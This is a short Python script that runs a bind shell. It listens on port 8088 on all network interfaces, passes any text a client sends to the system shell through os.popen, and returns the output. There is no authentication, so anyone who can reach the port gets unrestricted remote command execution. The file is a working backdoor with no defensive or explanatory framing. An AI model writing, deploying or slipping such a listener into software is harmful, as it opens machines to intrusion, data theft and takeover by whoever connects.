#!/usr/bin/env python3
# encoding: utf-8
#__author__ == 'vulMoss'

import socket
import threading
import os
import sys

bind_ip = "0.0.0.0"
bind_prot = 8088

server = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

server.bind((bind_ip,bind_prot))

server.listen(5)

print("[*] Listening on %s:%d" % (bind_ip,bind_prot))

def handle_client(client_socket):

    request = client_socket.recv(1024).decode()

    print("[*] Received: %s" % request)

    result = os.popen(request).read()

    client_socket.send(result.encode())
    client_socket.close()

while True:
    client,addr = server.accept()
    print("[*] Accepted connection from: %s:%d" % (addr[0],addr[1]))

    client_handler = threading.Thread(target = handle_client,args=(client,))
    client_handler.start()
